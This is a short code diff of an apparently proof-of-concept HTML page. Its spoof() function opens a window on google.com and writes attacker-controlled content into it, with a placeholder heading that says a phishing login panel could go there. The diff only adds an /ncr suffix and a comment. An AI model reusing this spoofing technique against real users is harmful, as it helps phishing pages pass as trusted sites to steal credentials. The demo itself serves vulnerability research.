@@ -1,7 +1,8 @@
 <html>
 <script>
 function spoof() {
-  w = window.open('https:/www.google.com', 'target');
+  // www.google.com/ncr will force google.com instead of redireting to locale specific domain
+  var w = window.open('https:/www.google.com/ncr', 'target');
   w.document.write('<h1 id="message">Here we could place a phishing login panel</h1>');
   w.document.close();
 }
